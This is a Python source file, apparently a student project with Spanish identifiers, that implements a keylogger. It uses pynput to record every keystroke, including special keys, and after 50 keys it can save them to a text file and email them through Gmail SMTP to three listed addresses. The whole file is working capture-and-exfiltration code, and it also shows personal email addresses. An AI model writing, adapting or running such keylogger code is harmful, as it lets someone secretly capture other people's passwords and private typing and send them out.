import subprocess
from pynput import keyboard
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

destino = 'Output.txt'
keys_presionados = []
listener = None
enviar_email = None
guardar_archivo = None

def callback(key):
    try:
        logging.log(10, key.char)
        keys_presionados.append(str(key.char))
    except AttributeError:
        special_keys = {
            key.backspace: '[Backspace]',
            key.ctrl_l: '[Ctrl]',
            key.ctrl_r: '[Ctrl]',
            key.alt_l: '[Alt]',
            key.alt_r: '[Alt]',
            key.shift_l: '[Shift]',
            key.shift_r: '[Shift]',
            key.tab: '[Tab]',
            key.enter: '[Enter]',
            key.space: '[Space]',
            key.esc: '[Esc]',
            key.left: '[Left]',
            key.right: '[Right]',
            key.up: '[Up]',
            key.down: '[Down]',
            key.insert: '[Insert]',
            key.delete: '[Delete]',
            key.home: '[Home]',
            key.end: '[End]',
            key.page_up: '[Page Up]',
            key.page_down: '[Page Down]',
            key.caps_lock: '[Caps Lock]',
            key.num_lock: '[Num Lock]',
            key.scroll_lock: '[Scroll Lock]'
        }

        if key in special_keys:
            logging.log(10, special_keys[key])
            keys_presionados.append(special_keys[key])


def guardar_txt():
    if len(keys_presionados) >= 50:
        if not os.path.exists(destino):
            with open(destino, 'w'):      
                with open(destino, 'a') as archivo_texto:
                    archivo_texto.write(''.join(keys_presionados))
                print(f"Registro guardado en {destino}")

def enviar_correo():
    if len(keys_presionados) >= 50:
        sender_email = 'itzelmor02@ciencias.unam.mx'
        receiver_email = ['josuemt02@ciencias.unam.mx', 'giselle_cruz@ciencias.unam.mx','carmelolucio312@gmail.com']
        password = 'Contraseña del correo'

        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = ', '.join(receiver_email)
        message['Subject'] = 'Keys Pressed'
        message.attach(MIMEText('\n'.join(keys_presionados), 'plain'))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, password)
            smtp.send_message(message)
        print("Correo enviado correctamente.")
        

def menu():
    global listener, enviar_email, guardar_archivo

    listener = keyboard.Listener(on_press=callback)
    listener.start()

    enviar_email = input("¿Deseas enviar los registros por email? (yes/y/no/n): ").lower()
    guardar_archivo = input("¿Deseas guardar los registros en texto plano? (yes/y/no/n): ").lower()

    while True:
        if len(keys_presionados) >= 50:
            if enviar_email in ['yes', 'y']:
                enviar_correo()

            if guardar_archivo in ['yes', 'y']:
                guardar_txt()

            keys_presionados.clear()  # Limpiar la lista después de enviar o guardar el archivo

            if enviar_email in ['exit', 'no', 'n'] and guardar_archivo in ['exit', 'no', 'n']:
                print("Saliendo del programa...")
                listener.stop()
                break

menu()